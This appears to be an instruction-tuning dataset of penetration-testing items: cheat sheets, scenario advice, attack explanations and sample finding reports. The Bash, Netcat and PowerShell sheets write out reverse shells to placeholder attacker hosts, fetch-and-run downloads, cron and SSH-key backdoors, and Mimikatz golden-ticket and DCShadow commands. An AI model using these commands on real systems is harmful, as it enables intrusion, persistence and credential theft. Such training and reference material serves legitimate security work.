{"instruction": "Give me a quick reference for Linux file permissions.", "input": "Need a cheat sheet for Linux file permissions during pentest.", "output": "Linux File Permissions Cheat Sheet\n\n[PERMISSION STRUCTURE]\n-rwxrwxrwx = type + owner + group + others\nr = read (4), w = write (2), x = execute (1)\n\n[COMMON PERMISSIONS]\n755 = rwxr-xr-x (executable, owner can modify)\n644 = rw-r--r-- (readable, owner can modify)\n777 = rwxrwxrwx (all permissions - DANGEROUS)\n600 = rw------- (owner only)\n700 = rwx------ (owner only, executable)\n\n[COMMANDS]\nchmod 755 file       # Set specific permissions\nchmod +x file        # Add execute permission\nchmod -w file        # Remove write permission\nchown user:group file  # Change owner\nchgrp group file     # Change group\n\n[SPECIAL PERMISSIONS]\nSUID (4xxx): Execute as file owner\nSGID (2xxx): Execute as file group\nSticky (1xxx): Only owner can delete\n\nfind / -perm -4000   # Find SUID files\nfind / -perm -2000   # Find SGID files"}
{"instruction": "Give me a quick reference for Windows CMD commands.", "input": "Need a cheat sheet for Windows CMD commands during pentest.", "output": "Windows Command Line Cheat Sheet\n\n[SYSTEM INFO]\nsysteminfo           # Detailed system info\nhostname             # Computer name\nwhoami /all          # Current user + groups + privs\nnet user             # List local users\nnet localgroup administrators  # List admins\n\n[NETWORKING]\nipconfig /all        # Network configuration\nnetstat -ano         # Active connections\narp -a               # ARP table\nroute print          # Routing table\nnslookup host        # DNS lookup\n\n[FILE OPERATIONS]\ndir /s /b *.txt      # Find files recursively\ntype file.txt        # Display file contents\nfindstr /si password *.txt  # Search for string\nicacls file          # Check file permissions\nattrib +h file       # Hide file\n\n[PROCESSES & SERVICES]\ntasklist             # List processes\ntaskkill /PID 1234   # Kill process\nsc query             # List services\nwmic process list    # Detailed process list\n\n[REGISTRY]\nreg query HKLM\\...   # Query registry\nreg add/delete       # Modify registry"}
{"instruction": "Give me a quick reference for Bash one-liners.", "input": "Need a cheat sheet for Bash one-liners during pentest.", "output": "Bash One-Liners for Pentesting\n\n[NETWORK]\n# Port scan without nmap\nfor p in {1..1000}; do (echo >/dev/tcp/host/$p) 2>/dev/null && echo \"$p open\"; done\n\n# Reverse shell\nbash -i >& /dev/tcp/ATTACKER/PORT 0>&1\n\n# Download file\ncurl http://attacker/file -o file\nwget http://attacker/file\n\n[ENUMERATION]\n# Find SUID binaries\nfind / -perm -4000 2>/dev/null\n\n# Find world-writable\nfind / -writable -type f 2>/dev/null\n\n# Find config files\nfind / -name \"*.conf\" -o -name \"*.config\" 2>/dev/null\n\n# Search for passwords\ngrep -r \"password\" / 2>/dev/null\n\n[FILE TRANSFER]\n# Python HTTP server\npython3 -m http.server 8080\n\n# Netcat file transfer\nnc -lvnp 4444 > file  # Receiver\nnc host 4444 < file   # Sender\n\n[PERSISTENCE]\n# Cron backdoor\necho \"* * * * * /path/to/shell\" | crontab -\n\n# SSH key persistence\necho \"attacker_key\" >> ~/.ssh/authorized_keys"}
{"instruction": "Give me a quick reference for PowerShell for pentesters.", "input": "Need a cheat sheet for PowerShell for pentesters during pentest.", "output": "PowerShell Pentesting Cheat Sheet\n\n[EXECUTION POLICY BYPASS]\npowershell -ep bypass\nSet-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\n\n[DOWNLOAD & EXECUTE]\nIEX(New-Object Net.WebClient).DownloadString('http://url/script.ps1')\nIEX(IWR 'http://url/script.ps1')\n\n[ENUMERATION]\nGet-Process                  # Running processes\nGet-Service                  # Services\nGet-LocalUser                # Local users\nGet-LocalGroupMember Administrators  # Admin members\nGet-ScheduledTask            # Scheduled tasks\nGet-ItemProperty 'HKLM:\\...'   # Registry\n\n[FILE OPERATIONS]\nGet-ChildItem -Recurse -Force   # List all files\nSelect-String -Path *.txt -Pattern \"password\"  # Search\nCopy-Item src dest              # Copy file\n\n[NETWORK]\nTest-NetConnection host -Port 80   # Port check\nInvoke-WebRequest http://url       # HTTP request\nGet-NetTCPConnection               # Connections\n\n[AMSI BYPASS (Educational)]\n# Various techniques exist to bypass AMSI\n# Search: \"AMSI bypass techniques\"\n\n[ENCODED COMMANDS]\n$cmd = \"whoami\"\n$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)\n$encoded = [Convert]::ToBase64String($bytes)\npowershell -enc $encoded"}
{"instruction": "Give me a quick reference for Metasploit quick reference.", "input": "Need a cheat sheet for Metasploit quick reference during pentest.", "output": "Metasploit Quick Reference\n\n[BASIC WORKFLOW]\nmsfconsole                    # Start Metasploit\nsearch [keyword]              # Find modules\nuse [module]                  # Select module\ninfo                          # Module information\nshow options                  # View settings\nset RHOSTS target             # Set target\nset LHOST attacker            # Set listener\nexploit / run                 # Execute\n\n[COMMON MODULES]\n# Scanning\nauxiliary/scanner/portscan/tcp\nauxiliary/scanner/smb/smb_ms17_010\n\n# Exploitation\nexploit/windows/smb/ms17_010_eternalblue\nexploit/multi/handler\n\n# Post-exploitation\npost/windows/gather/credentials/credential_collector\npost/multi/recon/local_exploit_suggester\n\n[PAYLOADS]\nwindows/meterpreter/reverse_tcp    # Windows meterpreter\nlinux/x64/meterpreter/reverse_tcp  # Linux meterpreter\nwindows/shell_reverse_tcp          # Basic shell\n\n[METERPRETER COMMANDS]\nsysinfo                       # System info\ngetuid                        # Current user\ngetsystem                     # Attempt privesc\nhashdump                      # Dump hashes\ndownload/upload               # File transfer\nshell                         # Drop to shell\nmigrate [PID]                 # Process migration\n\n[SESSION MANAGEMENT]\nsessions -l                   # List sessions\nsessions -i [id]              # Interact\nbackground                    # Background session"}
{"instruction": "Give me a quick reference for SQLMap reference.", "input": "Need a cheat sheet for SQLMap reference during pentest.", "output": "SQLMap Reference Guide\n\n[BASIC USAGE]\nsqlmap -u \"http://target/page?id=1\"\n\n[DETECTION]\n--level=5                     # More tests (1-5)\n--risk=3                      # Riskier tests (1-3)\n--technique=BEUSTQ            # Specific techniques\n\n[DATABASE ENUMERATION]\n--dbs                         # List databases\n--tables -D dbname            # List tables\n--columns -T table -D db      # List columns\n--dump -T table -D db         # Dump data\n--dump-all                    # Dump everything\n\n[AUTHENTICATION]\n--cookie=\"session=abc\"        # Set cookie\n--auth-type Basic             # HTTP auth\n--auth-cred user:pass         # Credentials\n\n[EVASION]\n--random-agent                # Random user-agent\n--tamper=space2comment        # Use tamper script\n--delay=1                     # Delay between requests\n--proxy=http://127.0.0.1:8080 # Use proxy\n\n[OS INTERACTION]\n--os-shell                    # Get OS shell\n--os-pwn                      # Meterpreter shell\n--file-read=/etc/passwd       # Read file\n--file-write=local --file-dest=remote  # Write file\n\n[OUTPUT]\n-o                            # Output directory\n--batch                       # Non-interactive\n--flush-session               # Fresh start"}
{"instruction": "Give me a quick reference for Burp Suite tips.", "input": "Need a cheat sheet for Burp Suite tips during pentest.", "output": "Burp Suite Essential Tips\n\n[PROXY SETUP]\n1. Configure browser: localhost:8080\n2. Install Burp CA certificate for HTTPS\n3. Enable interception as needed\n\n[REPEATER WORKFLOW]\n1. Right-click request \u2192 Send to Repeater\n2. Modify parameters\n3. Click \"Send\"\n4. Analyze response\n\n[INTRUDER ATTACKS]\nSniper: Single payload, multiple positions\nBattering Ram: Same payload, all positions\nPitchfork: Parallel payload lists\nCluster Bomb: All payload combinations\n\n[USEFUL EXTENSIONS]\n- Logger++: Enhanced logging\n- Autorize: Authorization testing\n- JWT Editor: JWT manipulation\n- Active Scan++: Enhanced scanning\n\n[TIPS]\n- Use scope to filter traffic\n- Save requests to project\n- Use comparer for diff analysis\n- Configure out-of-scope to reduce noise\n- Use match/replace for automated modifications\n\n[KEYBOARD SHORTCUTS]\nCtrl+R: Send to Repeater\nCtrl+I: Send to Intruder\nCtrl+U: URL encode selection\nCtrl+Shift+U: URL decode"}
{"instruction": "Give me a quick reference for Hashcat modes.", "input": "Need a cheat sheet for Hashcat modes during pentest.", "output": "Hashcat Common Modes Reference\n\n[HASH MODES (-m)]\n0       MD5\n100     SHA1\n500     MD5crypt ($1$)\n900     MD4\n1000    NTLM\n1100    Domain Cached Credentials (DCC)\n1400    SHA256\n1700    SHA512\n1800    SHA512crypt ($6$)\n2500    WPA-PBKDF2\n3000    LM\n3200    bcrypt ($2a$)\n5500    NetNTLMv1\n5600    NetNTLMv2\n7500    Kerberos 5 AS-REQ Pre-Auth\n13100   Kerberos 5 TGS-REP (Kerberoast)\n18200   Kerberos 5 AS-REP (ASREP roast)\n\n[ATTACK MODES (-a)]\n0       Dictionary\n1       Combination\n3       Brute-force (mask)\n6       Hybrid dictionary + mask\n7       Hybrid mask + dictionary\n\n[MASK CHARSET]\n?l      lowercase (a-z)\n?u      uppercase (A-Z)\n?d      digits (0-9)\n?s      special chars\n?a      all printable\n?b      all bytes (0x00-0xff)\n\n[EXAMPLE COMMANDS]\n# NTLM with dictionary\nhashcat -m 1000 hash.txt rockyou.txt\n\n# NTLM with rules\nhashcat -m 1000 hash.txt rockyou.txt -r best64.rule\n\n# 8-char brute force\nhashcat -m 1000 hash.txt -a 3 ?a?a?a?a?a?a?a?a"}
{"instruction": "Give me a quick reference for Netcat usage.", "input": "Need a cheat sheet for Netcat usage during pentest.", "output": "Netcat (nc) Usage Guide\n\n[BASIC CONNECTIVITY]\nnc -v host port               # Connect to port\nnc -vz host 1-1000            # Port scan\nnc -l -p port                 # Listen on port\n\n[FILE TRANSFER]\n# Receiver (run first):\nnc -l -p 4444 > received_file\n\n# Sender:\nnc target 4444 < file_to_send\n\n[REVERSE SHELL]\n# Attacker (listener):\nnc -lvnp 4444\n\n# Victim (Linux):\nnc attacker 4444 -e /bin/bash\n\n# If -e not available:\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker 4444 > /tmp/f\n\n[BIND SHELL]\n# Victim (listener):\nnc -lvnp 4444 -e /bin/bash\n\n# Attacker (connect):\nnc victim 4444\n\n[PORT FORWARDING]\n# Basic relay\nnc -l -p 8080 | nc target 80\n\n# With responses\nmkfifo pipe\nnc -l -p 8080 < pipe | nc target 80 > pipe\n\n[FLAGS]\n-l     Listen mode\n-v     Verbose\n-n     No DNS resolution\n-p     Specify port\n-e     Execute program\n-u     UDP mode\n-w     Timeout (seconds)\n-z     Zero-I/O mode (scanning)"}
{"instruction": "Give me a quick reference for Nmap NSE scripts.", "input": "Need a cheat sheet for Nmap NSE scripts during pentest.", "output": "Nmap NSE Scripts Reference\n\n[CATEGORIES]\nauth        Authentication scripts\nbroadcast   Broadcast discovery\nbrute       Brute force attacks\ndefault     Default scripts (-sC)\ndiscovery   Service discovery\ndos         Denial of service (careful!)\nexploit     Exploitation scripts\nexternal    External services\nfuzzer      Fuzzing scripts\nintrusive   Intrusive scripts\nmalware     Malware detection\nsafe        Safe scripts\nversion     Version detection\nvuln        Vulnerability detection\n\n[COMMON SCRIPTS]\n# SMB\nsmb-enum-users\nsmb-enum-shares\nsmb-vuln-ms17-010\n\n# HTTP\nhttp-enum\nhttp-methods\nhttp-vuln-*\n\n# DNS\ndns-brute\ndns-zone-transfer\n\n# SSL/TLS\nssl-enum-ciphers\nssl-heartbleed\n\n[USAGE]\nnmap --script [script] target\nnmap --script [category] target\nnmap --script \"http-*\" target\nnmap --script-args [args] target\n\n[EXAMPLES]\n# Vulnerability scan\nnmap --script vuln target\n\n# SMB enumeration\nnmap --script smb-* target\n\n# HTTP enumeration\nnmap --script http-enum,http-methods target\n\n# All default + safe\nnmap -sC target"}
{"instruction": "What should I do in this situation: Found SQL injection but no database credentials visible", "input": "Pentest situation: Found SQL injection but no database credentials visible\nOptions: Try to extract credentials, Attempt file read, Try OS command execution, Enumerate database structure", "output": "Decision Analysis\n\n[SITUATION]\nFound SQL injection but no database credentials visible\n\n[OPTIONS CONSIDERED]\n- Try to extract credentials\n- Attempt file read\n- Try OS command execution\n- Enumerate database structure\n\n[RECOMMENDED ACTION]\nEnumerate database structure first to understand the schema, then attempt to extract credentials from user tables. If permissions allow, try file read for config files.\n\n[RISK ASSESSMENT]\nMEDIUM - SQLi provides significant access potential\n\n[DECISION FACTORS]\n1. Scope compliance - Is this within authorized boundaries?\n2. Impact potential - What could go wrong?\n3. Value - What do we gain from this action?\n4. Detection - Will this trigger alerts?\n5. Recovery - Can we roll back if needed?\n\n[DOCUMENTATION]\n- Record decision and rationale\n- Document any risks accepted\n- Note time and context"}
{"instruction": "What should I do in this situation: Discovered internal admin panel without authentication", "input": "Pentest situation: Discovered internal admin panel without authentication\nOptions: Document and report, Explore functionality, Attempt to gain shell, Check for sensitive data", "output": "Decision Analysis\n\n[SITUATION]\nDiscovered internal admin panel without authentication\n\n[OPTIONS CONSIDERED]\n- Document and report\n- Explore functionality\n- Attempt to gain shell\n- Check for sensitive data\n\n[RECOMMENDED ACTION]\nDocument the finding, then carefully explore functionality to understand impact. Check for sensitive data exposure and potential for further exploitation.\n\n[RISK ASSESSMENT]\nHIGH - Unauthenticated admin access is critical\n\n[DECISION FACTORS]\n1. Scope compliance - Is this within authorized boundaries?\n2. Impact potential - What could go wrong?\n3. Value - What do we gain from this action?\n4. Detection - Will this trigger alerts?\n5. Recovery - Can we roll back if needed?\n\n[DOCUMENTATION]\n- Record decision and rationale\n- Document any risks accepted\n- Note time and context"}
{"instruction": "What should I do in this situation: Gained user shell but need root/SYSTEM", "input": "Pentest situation: Gained user shell but need root/SYSTEM\nOptions: Run privilege escalation enumeration, Check sudo permissions, Look for stored credentials, Search for kernel exploits", "output": "Decision Analysis\n\n[SITUATION]\nGained user shell but need root/SYSTEM\n\n[OPTIONS CONSIDERED]\n- Run privilege escalation enumeration\n- Check sudo permissions\n- Look for stored credentials\n- Search for kernel exploits\n\n[RECOMMENDED ACTION]\nRun automated enumeration (LinPEAS/WinPEAS) first to identify all potential vectors. Check sudo/services before attempting kernel exploits.\n\n[RISK ASSESSMENT]\nMEDIUM - Privilege escalation extends access\n\n[DECISION FACTORS]\n1. Scope compliance - Is this within authorized boundaries?\n2. Impact potential - What could go wrong?\n3. Value - What do we gain from this action?\n4. Detection - Will this trigger alerts?\n5. Recovery - Can we roll back if needed?\n\n[DOCUMENTATION]\n- Record decision and rationale\n- Document any risks accepted\n- Note time and context"}
{"instruction": "What should I do in this situation: Found default credentials on network device", "input": "Pentest situation: Found default credentials on network device\nOptions: Change the password, Document only, Extract configuration, Pivot through device", "output": "Decision Analysis\n\n[SITUATION]\nFound default credentials on network device\n\n[OPTIONS CONSIDERED]\n- Change the password\n- Document only\n- Extract configuration\n- Pivot through device\n\n[RECOMMENDED ACTION]\nDocument the finding with evidence. Extract configuration for analysis (may contain more credentials). Do NOT change the password - this could impact operations.\n\n[RISK ASSESSMENT]\nHIGH - Network device compromise can enable pivoting\n\n[DECISION FACTORS]\n1. Scope compliance - Is this within authorized boundaries?\n2. Impact potential - What could go wrong?\n3. Value - What do we gain from this action?\n4. Detection - Will this trigger alerts?\n5. Recovery - Can we roll back if needed?\n\n[DOCUMENTATION]\n- Record decision and rationale\n- Document any risks accepted\n- Note time and context"}
{"instruction": "What should I do in this situation: Web application WAF blocking payloads", "input": "Pentest situation: Web application WAF blocking payloads\nOptions: Give up on this vector, Try encoding bypass, Use different attack type, Find WAF bypass", "output": "Decision Analysis\n\n[SITUATION]\nWeb application WAF blocking payloads\n\n[OPTIONS CONSIDERED]\n- Give up on this vector\n- Try encoding bypass\n- Use different attack type\n- Find WAF bypass\n\n[RECOMMENDED ACTION]\nFirst identify what's being blocked, then try encoding (URL, double URL, unicode). If that fails, try alternative payloads or different vulnerability types.\n\n[RISK ASSESSMENT]\nLOW - WAF bypass is about technique refinement\n\n[DECISION FACTORS]\n1. Scope compliance - Is this within authorized boundaries?\n2. Impact potential - What could go wrong?\n3. Value - What do we gain from this action?\n4. Detection - Will this trigger alerts?\n5. Recovery - Can we roll back if needed?\n\n[DOCUMENTATION]\n- Record decision and rationale\n- Document any risks accepted\n- Note time and context"}
{"instruction": "What should I do in this situation: Discovered credentials in GitHub repository", "input": "Pentest situation: Discovered credentials in GitHub repository\nOptions: Test credentials immediately, Verify scope first, Report to client, Check for additional secrets", "output": "Decision Analysis\n\n[SITUATION]\nDiscovered credentials in GitHub repository\n\n[OPTIONS CONSIDERED]\n- Test credentials immediately\n- Verify scope first\n- Report to client\n- Check for additional secrets\n\n[RECOMMENDED ACTION]\nVerify the credentials are in scope, then check repository history for additional secrets before testing. Document all findings even if credentials are old/rotated.\n\n[RISK ASSESSMENT]\nMEDIUM-HIGH - Exposed credentials are significant findings\n\n[DECISION FACTORS]\n1. Scope compliance - Is this within authorized boundaries?\n2. Impact potential - What could go wrong?\n3. Value - What do we gain from this action?\n4. Detection - Will this trigger alerts?\n5. Recovery - Can we roll back if needed?\n\n[DOCUMENTATION]\n- Record decision and rationale\n- Document any risks accepted\n- Note time and context"}
{"instruction": "What should I do in this situation: EDR detected and killed payload", "input": "Pentest situation: EDR detected and killed payload\nOptions: Try different payload, Disable EDR (if possible), Use different technique, Note detection and move on", "output": "Decision Analysis\n\n[SITUATION]\nEDR detected and killed payload\n\n[OPTIONS CONSIDERED]\n- Try different payload\n- Disable EDR (if possible)\n- Use different technique\n- Note detection and move on\n\n[RECOMMENDED ACTION]\nNote the detection for reporting, then try alternative techniques: different payload format, execution method, or evasion techniques. Do not disable EDR without explicit authorization.\n\n[RISK ASSESSMENT]\nLOW - Detection is expected in mature environments\n\n[DECISION FACTORS]\n1. Scope compliance - Is this within authorized boundaries?\n2. Impact potential - What could go wrong?\n3. Value - What do we gain from this action?\n4. Detection - Will this trigger alerts?\n5. Recovery - Can we roll back if needed?\n\n[DOCUMENTATION]\n- Record decision and rationale\n- Document any risks accepted\n- Note time and context"}
{"instruction": "What should I do in this situation: Found password hash but can't crack it", "input": "Pentest situation: Found password hash but can't crack it\nOptions: Continue cracking attempts, Try pass the hash, Move to different target, Look for hash in online databases", "output": "Decision Analysis\n\n[SITUATION]\nFound password hash but can't crack it\n\n[OPTIONS CONSIDERED]\n- Continue cracking attempts\n- Try pass the hash\n- Move to different target\n- Look for hash in online databases\n\n[RECOMMENDED ACTION]\nCheck online databases (hashes.org) first. If NTLM, try pass-the-hash instead of cracking. Expand wordlist or use rules if continuing cracking.\n\n[RISK ASSESSMENT]\nLOW - Hash cracking is resource vs time tradeoff\n\n[DECISION FACTORS]\n1. Scope compliance - Is this within authorized boundaries?\n2. Impact potential - What could go wrong?\n3. Value - What do we gain from this action?\n4. Detection - Will this trigger alerts?\n5. Recovery - Can we roll back if needed?\n\n[DOCUMENTATION]\n- Record decision and rationale\n- Document any risks accepted\n- Note time and context"}
{"instruction": "What should I do in this situation: Client reports production system impact", "input": "Pentest situation: Client reports production system impact\nOptions: Stop testing immediately, Investigate cause, Continue on other targets, Document incident", "output": "Decision Analysis\n\n[SITUATION]\nClient reports production system impact\n\n[OPTIONS CONSIDERED]\n- Stop testing immediately\n- Investigate cause\n- Continue on other targets\n- Document incident\n\n[RECOMMENDED ACTION]\nSTOP all testing immediately. Document exact actions leading to report. Contact client to discuss. Resume only after clearance.\n\n[RISK ASSESSMENT]\nCRITICAL - Production impact is serious incident\n\n[DECISION FACTORS]\n1. Scope compliance - Is this within authorized boundaries?\n2. Impact potential - What could go wrong?\n3. Value - What do we gain from this action?\n4. Detection - Will this trigger alerts?\n5. Recovery - Can we roll back if needed?\n\n[DOCUMENTATION]\n- Record decision and rationale\n- Document any risks accepted\n- Note time and context"}
{"instruction": "What should I do in this situation: Discovered evidence of prior compromise", "input": "Pentest situation: Discovered evidence of prior compromise\nOptions: Continue pentest normally, Alert client immediately, Investigate further, Document and include in report", "output": "Decision Analysis\n\n[SITUATION]\nDiscovered evidence of prior compromise\n\n[OPTIONS CONSIDERED]\n- Continue pentest normally\n- Alert client immediately\n- Investigate further\n- Document and include in report\n\n[RECOMMENDED ACTION]\nIMMEDIATELY notify client of potential prior compromise. Preserve evidence, document findings. This may trigger incident response and change engagement scope.\n\n[RISK ASSESSMENT]\nCRITICAL - Active breach requires immediate response\n\n[DECISION FACTORS]\n1. Scope compliance - Is this within authorized boundaries?\n2. Impact potential - What could go wrong?\n3. Value - What do we gain from this action?\n4. Detection - Will this trigger alerts?\n5. Recovery - Can we roll back if needed?\n\n[DOCUMENTATION]\n- Record decision and rationale\n- Document any risks accepted\n- Note time and context"}
{"instruction": "Explain what Pass the Hash is and how it works.", "input": "I need to understand Pass the Hash for penetration testing.", "output": "Pass the Hash (PtH) is an attack technique where an attacker uses the NTLM hash of a user's password instead of the plaintext password to authenticate.\n\n[HOW IT WORKS]\n1. Attacker compromises a system and extracts NTLM hashes\n2. Using tools like Mimikatz, the hash is injected into a new logon session\n3. The attacker can authenticate to other systems without knowing the actual password\n\n[REQUIREMENTS]\n- NTLM hash of target user\n- Target must accept NTLM authentication\n- Network access to target system\n\n[TOOLS]\n- Mimikatz: sekurlsa::pth\n- Impacket: psexec.py -hashes\n- CrackMapExec: cme smb -H\n\n[DETECTION]\n- Event ID 4624 with LogonType 3 or 9\n- Network logons from unexpected sources\n- NTLM authentication when Kerberos expected\n\n[MITIGATION]\n- Credential Guard on Windows 10+\n- Protected Users security group\n- Restrict NTLM usage\n- Privileged Access Workstations"}
{"instruction": "Explain what Kerberoasting is and how it works.", "input": "I need to understand Kerberoasting for penetration testing.", "output": "Kerberoasting is an attack targeting service accounts in Active Directory by requesting and cracking Kerberos service tickets.\n\n[HOW IT WORKS]\n1. Attacker identifies service accounts with SPNs (Service Principal Names)\n2. Requests TGS (Ticket Granting Service) ticket for those services\n3. Extracts the ticket which is encrypted with the service account's hash\n4. Cracks the ticket offline to recover the password\n\n[REQUIREMENTS]\n- Valid domain user account (any user can request service tickets)\n- Service accounts with SPNs registered\n- Weak service account passwords\n\n[TOOLS]\n- Rubeus: kerberoast\n- Impacket: GetUserSPNs.py\n- PowerView: Invoke-Kerberoast\n\n[CRACKING]\nhashcat -m 13100 tickets.txt wordlist.txt\n\n[DETECTION]\n- Event ID 4769 (TGS request) with unusual volume\n- Requests for multiple services from single user\n- RC4 encryption requests (downgrade)\n\n[MITIGATION]\n- Strong passwords (25+ chars) for service accounts\n- Use MSA/gMSA (Managed Service Accounts)\n- Monitor for Kerberoasting indicators"}
{"instruction": "Explain what Golden Ticket is and how it works.", "input": "I need to understand Golden Ticket for penetration testing.", "output": "A Golden Ticket is a forged Kerberos TGT (Ticket Granting Ticket) that provides complete domain access by impersonating any user.\n\n[HOW IT WORKS]\n1. Attacker obtains the KRBTGT account's NTLM hash (via DCSync or DC compromise)\n2. Uses the hash to forge a TGT for any user, including Domain Admin\n3. The forged ticket is accepted by any system in the domain\n4. Valid until KRBTGT password is changed TWICE\n\n[REQUIREMENTS]\n- KRBTGT NTLM hash\n- Domain SID\n- Domain name\n\n[CREATION]\nUsing Mimikatz:\n```\nkerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /id:500\n```\n\n[PERSISTENCE]\n- Ticket valid for 10 years by default\n- Survives password resets (except KRBTGT)\n- Works even if user account deleted\n\n[DETECTION]\n- TGT with unusual lifetime\n- TGT without corresponding AS-REQ\n- Authentication anomalies in logs\n\n[MITIGATION]\n- Protect Domain Controllers\n- Reset KRBTGT password periodically (TWICE)\n- Monitor for DCSync attempts"}
{"instruction": "Explain what LLMNR/NBT-NS Poisoning is and how it works.", "input": "I need to understand LLMNR/NBT-NS Poisoning for penetration testing.", "output": "LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) poisoning exploits Windows name resolution fallback mechanisms.\n\n[HOW IT WORKS]\n1. When a host can't resolve a name via DNS, it broadcasts LLMNR/NBT-NS queries\n2. Attacker on same network responds claiming to be the requested host\n3. Victim sends credentials (usually NTLMv2 hash) to attacker\n4. Attacker captures hash for offline cracking or relay attacks\n\n[REQUIREMENTS]\n- Network access (same broadcast domain as victims)\n- LLMNR/NBT-NS not disabled on target network\n- Users making typos or accessing unavailable resources\n\n[TOOLS]\n- Responder: responder -I eth0 -wrf\n- Inveigh (PowerShell): Invoke-Inveigh\n\n[CAPTURED DATA]\n- NTLMv1/v2 hashes (crack with hashcat -m 5600)\n- Potential for relay attacks (ntlmrelayx)\n\n[DETECTION]\n- Monitor for LLMNR/NBT-NS traffic\n- Honeypot names that shouldn't resolve\n- Network anomaly detection\n\n[MITIGATION]\n- Disable LLMNR and NBT-NS via GPO\n- Enable SMB signing (prevents relay)\n- Network segmentation"}
{"instruction": "Explain what Server-Side Request Forgery (SSRF) is and how it works.", "input": "I need to understand Server-Side Request Forgery (SSRF) for penetration testing.", "output": "SSRF is a vulnerability where an attacker can make a server perform requests to unintended locations, potentially accessing internal resources.\n\n[HOW IT WORKS]\n1. Application accepts user input for making HTTP requests (URLs, webhooks, etc.)\n2. Attacker provides URL pointing to internal resource or localhost\n3. Server makes request with its own privileges/network position\n4. Internal data returned to attacker or actions performed\n\n[COMMON TARGETS]\n- http://localhost/admin\n- http://169.254.169.254/ (cloud metadata)\n- http://internal.corp.local/\n- file:///etc/passwd\n\n[IMPACT]\n- Access internal services\n- Cloud metadata exposure (credentials)\n- Port scanning internal network\n- Potential RCE via internal services\n\n[BYPASS TECHNIQUES]\n- IP encoding: 0x7f.0x0.0x0.0x1 = 127.0.0.1\n- DNS rebinding\n- URL parser confusion\n- Protocol handlers: gopher://, dict://\n\n[DETECTION]\n- Monitor outbound requests from web servers\n- Unusual DNS queries from web servers\n- Requests to metadata endpoints\n\n[MITIGATION]\n- Whitelist allowed URLs/domains\n- Block internal IP ranges\n- Disable unnecessary URL schemes\n- Use network segmentation"}
{"instruction": "Explain what DCShadow is and how it works.", "input": "I need to understand DCShadow for penetration testing.", "output": "DCShadow is a stealthy persistence technique that registers a rogue Domain Controller to push malicious changes to Active Directory.\n\n[HOW IT WORKS]\n1. Attacker registers compromised server as a DC in AD\n2. Pushes malicious changes (backdoor admin, modify ACLs, etc.)\n3. Changes replicate to legitimate DCs\n4. Rogue DC unregisters, leaving minimal traces\n\n[REQUIREMENTS]\n- Domain Admin or equivalent privileges\n- Direct network access to DC\n- Mimikatz on compromised system\n\n[EXECUTION]\nUsing Mimikatz (two sessions):\n```\n# Session 1: Register rogue DC\nlsadump::dcshadow /object:user /attribute:... /value:...\n\n# Session 2: Push changes\nlsadump::dcshadow /push\n```\n\n[USE CASES]\n- Add user to privileged groups\n- Modify SID History\n- Change password without logging\n- Inject malicious SPNs\n\n[DETECTION]\n- New DCs appearing in AD\n- Replication from unknown sources\n- Event ID 4742 (computer account modified)\n\n[MITIGATION]\n- Monitor for new DC registrations\n- Protect Domain Admins\n- Advanced threat detection solutions"}
{"instruction": "Write a finding report for: SQL Injection in Login Form", "input": "Found sql injection in login form during pentest. Severity: CRITICAL", "output": "Finding Report: SQL Injection in Login Form\n\n[SEVERITY]\nCRITICAL (CVSS: 9.8)\n\n[DESCRIPTION]\nThe login form is vulnerable to SQL injection through the username parameter, allowing authentication bypass and data extraction.\n\n[EVIDENCE]\nParameter: username\nPayload: admin' OR '1'='1'--\nResult: Authenticated as admin without password\n\n[IMPACT]\nAttacker can bypass authentication, access all user accounts, extract sensitive data, and potentially execute system commands.\n\n[REMEDIATION]\nUse parameterized queries/prepared statements. Implement input validation. Apply principle of least privilege for database accounts.\n\n[REFERENCES]\n- OWASP Testing Guide\n- CWE Database\n- Vendor security documentation\n\n[VERIFICATION]\nAfter remediation, retest to confirm:\n1. Vulnerability no longer exploitable\n2. Mitigation does not break functionality\n3. Similar issues addressed throughout application"}
{"instruction": "Write a finding report for: Default Administrator Credentials", "input": "Found default administrator credentials during pentest. Severity: HIGH", "output": "Finding Report: Default Administrator Credentials\n\n[SEVERITY]\nHIGH (CVSS: 8.1)\n\n[DESCRIPTION]\nThe network switch at 10.0.0.1 is accessible with default credentials admin/admin.\n\n[EVIDENCE]\nTarget: 10.0.0.1\nService: SSH (port 22)\nCredentials: admin/admin\nAccess Level: Full administrative\n\n[IMPACT]\nAttacker can reconfigure network device, intercept traffic, create persistent backdoor, or disrupt network services.\n\n[REMEDIATION]\nChange default credentials immediately. Implement strong password policy. Use centralized authentication (RADIUS/TACACS+).\n\n[REFERENCES]\n- OWASP Testing Guide\n- CWE Database\n- Vendor security documentation\n\n[VERIFICATION]\nAfter remediation, retest to confirm:\n1. Vulnerability no longer exploitable\n2. Mitigation does not break functionality\n3. Similar issues addressed throughout application"}
{"instruction": "Write a finding report for: Missing Security Headers", "input": "Found missing security headers during pentest. Severity: LOW", "output": "Finding Report: Missing Security Headers\n\n[SEVERITY]\nLOW (CVSS: 3.1)\n\n[DESCRIPTION]\nThe web application does not implement security headers that protect against common web attacks.\n\n[EVIDENCE]\nMissing headers:\n- X-Content-Type-Options\n- X-Frame-Options\n- Content-Security-Policy\n- Strict-Transport-Security\n\n[IMPACT]\nApplication may be vulnerable to clickjacking, MIME-sniffing attacks, and certain XSS variants. Users may connect over insecure channels.\n\n[REMEDIATION]\nImplement all recommended security headers. Consider using a security-focused web server configuration template.\n\n[REFERENCES]\n- OWASP Testing Guide\n- CWE Database\n- Vendor security documentation\n\n[VERIFICATION]\nAfter remediation, retest to confirm:\n1. Vulnerability no longer exploitable\n2. Mitigation does not break functionality\n3. Similar issues addressed throughout application"}
{"instruction": "What's the first thing I should do when starting a pentest?", "input": "", "output": "Review the scope and rules of engagement. Confirm authorized targets, testing windows, and any excluded systems. Set up your testing environment and document everything from the start."}
{"instruction": "How do I know if I found something important?", "input": "", "output": "Consider impact: Can it lead to data breach? System compromise? Privilege escalation? If unsure, document it anyway. Better to report a minor finding than miss something critical."}
{"instruction": "Should I try harder if my exploit isn't working?", "input": "", "output": "First, verify you're targeting the right vulnerability. Check version numbers, permissions, and prerequisites. If it's still not working, try alternative techniques before moving on."}
